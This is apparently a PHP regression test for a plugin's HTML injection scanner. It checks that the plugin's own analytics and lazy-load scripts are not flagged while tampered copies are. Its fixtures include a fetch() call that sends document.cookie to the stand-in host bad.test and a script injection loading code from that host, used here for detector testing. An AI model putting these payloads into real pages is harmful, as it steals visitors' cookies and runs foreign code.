<?php
// The HTML Injection Scanner must not report Tool Kits' own inline scripts (delayed gtag loader, lazy-media bootstrap,
// delayed-script replay) as unverified dynamic loaders, while copies that are edited, extended, renamed or bound to
// another Measurement ID stay findings.
if (PHP_SAPI !== 'cli') { exit; }
error_reporting(E_ALL);
set_error_handler(function ($level, $message) { if (error_reporting() & $level) { throw new RuntimeException($message); } return false; });
define('ABSPATH', '/tmp/');
define('TK_VERSION', 'test');
$GLOBALS['tk'] = array('google_analytics_gtag_id' => 'G-ZT2EE3PHJW');
$GLOBALS['filters'] = array();
$checks = 0;

function check_party($condition, $message) { if (!$condition) { throw new RuntimeException($message); } $GLOBALS['checks']++; }
function add_filter($hook, $callback) { $GLOBALS['filters'][$hook][] = $callback; }
function add_action() {}
function apply_filters($hook, $value) { foreach ($GLOBALS['filters'][$hook] ?? array() as $callback) { $value = $callback($value); } return $value; }
function tk_get_option($key, $default = null) { return $GLOBALS['tk'][$key] ?? $default; }
function tk_license_features_enabled() { return true; }
function esc_js($value) { return addslashes($value); }
function is_admin() { return false; }

require dirname(__DIR__) . '/includes/analytics.php';
require dirname(__DIR__) . '/includes/lazy-load.php';
require dirname(__DIR__) . '/includes/asset-optimization.php';
require dirname(__DIR__) . '/includes/minify.php';
require dirname(__DIR__) . '/includes/html-injection-engine.php';

tk_analytics_init();
tk_lazy_load_init();
tk_assets_opt_init();
$registry = $GLOBALS['filters']['tk_html_scan_first_party_scripts'] ?? array();
check_party(count($registry) === 3, 'Each of the three modules must register its own script source');

function findings_party(string $html): array {
    return array_column(TK_HTML_Injection_Engine::scan($html, 'https://site.test/')['findings'], 'rule');
}
function page_party(string $script, string $attributes = ''): string { return '<html><body><script' . $attributes . '>' . $script . '</script></body></html>'; }

$gtag = tk_analytics_gtag_script('G-ZT2EE3PHJW');
$lazy = tk_lazy_frontend_script_source();
$delay = tk_assets_delay_js_source();

// The bug: with nothing registered, Tool Kits' own scripts are reported on every scanned page.
$saved = $GLOBALS['filters'];
$GLOBALS['filters'] = array();
check_party(in_array('dynamic_script_loader', findings_party(page_party($gtag)), true), 'Without registration the gtag loader is no longer a finding; the regression would not catch a revert');
check_party(in_array('dynamic_script_loader', findings_party(page_party($lazy, ' id="tool-kits-lazy-js-after"')), true), 'Without registration the lazy bootstrap is no longer a finding; the regression would not catch a revert');
check_party(in_array('dynamic_script_loader', findings_party(page_party($delay)), true), 'Without registration the delay bootstrap is no longer a finding');
$GLOBALS['filters'] = $saved;

// Own scripts are recognised: as printed, and as minified by Tool Kits before they reach visitors.
foreach (array('gtag' => $gtag, 'lazy' => $lazy, 'delay' => $delay) as $name => $source) {
    check_party(findings_party(page_party($source)) === array(), 'Own ' . $name . ' script was reported: ' . json_encode(findings_party(page_party($source))));
    check_party(findings_party(page_party(tk_minify_inline_js($source), ' nonce="abc"')) === array(), 'Minified own ' . $name . ' script was reported');
}
$result = TK_HTML_Injection_Engine::scan(page_party($lazy), 'https://site.test/');
check_party($result['findings'] === array() && count($result['suppressed']) >= 1, 'The own script should be listed as a recognised integration, not dropped silently');

// Look-alikes stay findings.
$bad = array(
    'extra statement' => page_party($lazy . "\nfetch('https://bad.test/c?' + document.cookie);"),
    'one token renamed' => page_party(str_replace('tkLazyMediaInitialized', 'tkLazyMediaReady', $lazy)),
    'another source host' => page_party(str_replace('www.googletagmanager.com', 'bad.test', $gtag)),
    'another Measurement ID' => page_party(tk_analytics_gtag_script('G-ATTACKER9')),
    'trusted id, hostile content' => page_party('let s=document.createElement("script");s.src="https://bad.test/a.js";document.head.appendChild(s);', ' id="tool-kits-lazy-js-after"'),
    'trusted id on the gtag loader' => page_party('let s=document.createElement("script");s.src="https://bad.test/a.js";document.head.appendChild(s);', ' id="tk-assets-delay-js"'),
);
foreach ($bad as $label => $html) { check_party(findings_party($html) !== array(), 'Look-alike was approved: ' . $label); }

// The gtag loader is approved only while its Measurement ID is the saved one.
$GLOBALS['tk']['google_analytics_gtag_id'] = '';
check_party(findings_party(page_party($gtag)) !== array(), 'Gtag loader approved although no Measurement ID is saved');
$GLOBALS['tk']['google_analytics_gtag_id'] = 'G-OTHER0001';
check_party(findings_party(page_party($gtag)) !== array(), 'Gtag loader approved for an ID that is not the saved one');
$GLOBALS['tk']['google_analytics_gtag_id'] = 'not an id';
check_party(findings_party(page_party($gtag)) !== array(), 'An invalid saved ID approved a loader');

echo 'PASS: ' . $checks . " first-party script checks (recognised as printed and minified, look-alikes and foreign IDs still reported)\n";
